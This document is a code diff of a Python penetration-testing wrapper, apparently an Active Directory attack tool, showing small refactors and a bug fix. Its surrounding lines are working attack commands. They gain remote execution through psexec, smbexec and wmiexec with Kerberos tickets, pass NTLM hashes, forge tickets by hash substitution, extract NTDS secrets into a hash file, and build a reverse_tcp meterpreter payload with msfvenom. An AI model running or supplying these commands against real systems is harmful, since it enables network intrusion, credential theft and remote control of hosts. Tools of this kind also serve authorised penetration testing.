@@ -142,13 +142,13 @@ def dotPadding(variable,value):
       variable += "."
    return variable
 
-def getTime(value):
+def getTime():
    variable = str(datetime.datetime.now().time())
    variable = variable.split(".")
    variable = variable[0]
    variable = variable.split(":")
    variable = variable[0] + ":" + variable[1]
-   variable = spacePadding(variable, value)
+   variable = spacePadding(variable, COL1)
    return variable
 
 def command(variable):
@@ -161,7 +161,7 @@ def prompt():
    selection = input("\nPress ENTER to continue...")
    return
    
-def wipeTokens():
+def wipeTokens(VALD):
    command("rm    " + dataDir + "/tokens.txt")
    command("touch " + dataDir + "/tokens.txt") 
    for x in range(0, maxUser):
@@ -190,15 +190,15 @@ def privCheck(TGT):
    count = len(open('ticket.tmp').readlines())
    if count > 1:
       print("[i] More than one ticket was found, using first in list...")
-   TGT = linecache.getline("ticket.tmp", 1).rstrip("\n")
-   TGT = TGT.rstrip(" ")
-   if TGT != "":
-      command("export KRB5CCNAME=" + TGT)
-      print("[*] Checking ticket " + TGT + "...")
+   variable = linecache.getline("ticket.tmp", 1).rstrip("\n")
+   variable = variable.rstrip(" ")
+   if variable != "":
+      command("export KRB5CCNAME=" + variable)
+      print("[*] Checking ticket status " + variable + "...")
       command(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
       command(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
       command(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
-      TGT = spacePadding(TGT, COL1)
+      TGT = spacePadding(variable, COL1)
    else:
       print("[-] Unable to find a valid ticket...")
    return (TGT)
@@ -804,16 +804,16 @@ command("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + localIP + " LPO
 # -------------------------------------------------------------------------------------
 
 while True: 
-   saveParams()                                             # PARAM'S SAVED
-   command("rm *.tmp")                                      # CLEAR GARBAGE
-   linecache.clearcache()                                   # CLEARS CACHES
-   checkParams = 0                                          # RESET'S VALUE
-   checkFile = ""	                                          # RESET'S VALUE
-   LTM = getTime(COL1)                                      # GET CLOCKTIME
-   command("clear")                                         # CLEARS SCREEN
-   display()                                                # DISPLAY UPPER
-   options()                                                # DISPLAY LOWER
-   selection=input("[*] Please select an option: ")			# SELECT CHOICE
+   saveParams()							# PARAM'S SAVED
+   command("rm *.tmp")						# CLEAR GARBAGE
+   linecache.clearcache()					# CLEARS CACHES
+   checkParams = 0						# RESET'S VALUE
+   checkFile = ""						# RESET'S VALUE
+   LTM = getTime()						# GET CLOCKTIME
+   command("clear")						# CLEARS SCREEN
+   display()							# DISPLAY UPPER
+   options()							# DISPLAY LOWER
+   selection=input("[*] Please select an option: ")		# SELECT CHOICE
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1654,7 +1654,7 @@ while True:
                   
          if os.path.getsize("users.tmp") != 0:
             command("rm " + dataDir + "/usernames.txt")
-            wipeTokens()
+            wipeTokens(VALD)
                 
             with open("users.tmp", "r") as read:
                for x in range(0, maxUser):
@@ -1710,7 +1710,7 @@ while True:
             command("sed -i -n '/Found user: /p' users.tmp")
             command("cat users.tmp | sort > users2.tmp")
             
-            wipeTokens()
+            wipeTokens(VALD)
             
             with open("users2.tmp", "r") as read:
                for x in range (0, maxUser):
@@ -1763,7 +1763,7 @@ while True:
                   command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
                else:
                   if registryKey.lower() != "quit":
-                     command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName ' -s" + registryKey + "' -s")
+                     command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
       prompt()
             
 # ------------------------------------------------------------------------------------- 
@@ -2202,7 +2202,6 @@ while True:
                                                        
                   if "[*] Saving ticket" in checkFile:
                      print("[*] Ticket successfully generated for " + USR.rstrip(" ") + " using hash substitute " + str(USER[counter]).rstrip(" ") + ":" + brute + "...")                    
-                     print("[*] Now checking ticket status..\n")
                      TGT = privCheck(TGT)                         
                      NTM = spacePadding(brute, COL1)
                      checkParams = 2
@@ -2590,7 +2589,7 @@ while True:
          command("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")         
          print("[+] Imported extracted secrets...")      
         
-         wipeTokens()
+         wipeTokens(VALD)
          
          with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
            for x in range (0, maxUser):
